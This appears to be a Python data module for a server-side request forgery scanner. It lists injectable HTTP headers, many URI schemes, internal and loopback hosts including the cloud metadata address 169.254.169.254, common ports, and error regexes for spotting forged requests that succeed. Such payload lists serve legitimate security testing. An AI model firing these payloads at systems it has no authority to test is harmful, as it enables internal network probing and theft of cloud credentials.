INJECT_MATCH_REPLACE = [
    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
]
# http://netinfo.link/http/header/
INJECT_HEADERS = [
    'X-Real-IP: http{ssl}://{host}{port}/',
    'X-Wap-Profile: http{ssl}://{host}{port}/test.xml',
    'Referer: http{ssl}://{host}{port}/',
    'X-Pingback: http{ssl}://{host}{port}/',
    'From: root@{host}{port}',
    'Forwarded: for={host};by={host};host={host}',
    'Contact: root@{host}', 
    'X-Real-IP: http{ssl}://{host}{port}/',
    'Client-IP: http{ssl}://{host}{port}/',
    'True-Client-IP: http{ssl}://{host}{port}/',
    'X-Backend: http{ssl}://{host}{port}/',
    'X-Forwarded-For: http{ssl}://{host}{port}/',
    'X-Client-IP: http{ssl}://{host}{port}/',
    'X-Originating-IP: http{ssl}://{host}{port}/',
    'X-Varnish-IP: http{ssl}://{host}{port}/',
    'X-Pingback-Forwarded-For{ssl}: http://{host}{port}/',
    'X-Served-By: http{ssl}://{host}{port}/',
    'X-Processed-By: http{ssl}://{host}{port}/',
    'X-Remote-Addr: http{ssl}://{host}{port}/',
    'X-Handled-By: http{ssl}://{host}{port}/',
    'X-Real-Ip: http{ssl}://{host}{port}/',
    'Servedby: http{ssl}://{host}{port}/',
    'X-Actual-Url: http{ssl}://{host}{port}/',
]
#URI schemes and their string format template
#https://www.iana.org/assignments/uri-schemes/uri-schemes.xml
#https://stackoverflow.com/questions/8464632/what-are-the-uri-url-schemes-for-most-im-networks
BASE_URI_SCHEMES = [
    'http{ssl}://{host}{port}/test', 
    'ftp{ssl}://{host}{port}/',
    "//{host}{port}/",
    '/\/\{host}{port}/\,'
]
EXTRA_URI_SCHEMES = [
    'aaa{ssl}:{host}{port};transport=tcp', 
    'acct:catcher@{host}{port}',
    'acct:catcher@{host}{port}@{host}{port}',
    'acr:0123456890123456789;domain={host}',
    'afp://{host}{port}/',
    'afp:/at/{host}:*',
    'aim://{host}{port}/',
    'cap://{host}/',
    'coap{ssl}://{host}{port}/test/a.xml',
    'coap{ssl}+tcp://{host}{port}/test/a.xml',
    'coap{ssl}-ws://{host}{port}/test/a.xml',
    '{ssl}ftp://{host}{port}/',
]

BASE_HOSTS = [
    '127.0.0.1',
    '0.0.0.0',
    '[::1]',
    'localhost'
    
]
EXTRA_HOSTS = [
    '127.127.127.127',
    '169.254.169.254',
    '0',
    '[0000::1]',
    'local',
]
BASE_POSTS = [21,22,80,111,443,445]

ERROR_MESSAGES = (
    {
        "name": "Python Urllib2 - Connection Refused",
        "type": "Python",
        "search": '(\[Errno 111\])?\sConnection\srefused',
    },   
    {
        "name": "Python Socket - Connection Timeout",
        "type": "Python",
        "search": 'The\sread\soperation\stimed\sout',

    }, 
    {
        "name": "PHP Curl - Connection Refused",
        "type": "PHP",
        "search": 'Failed\sto\sconnect\sto\s\S*\sport\s\d*:\sConnection\srefused',

    },  
)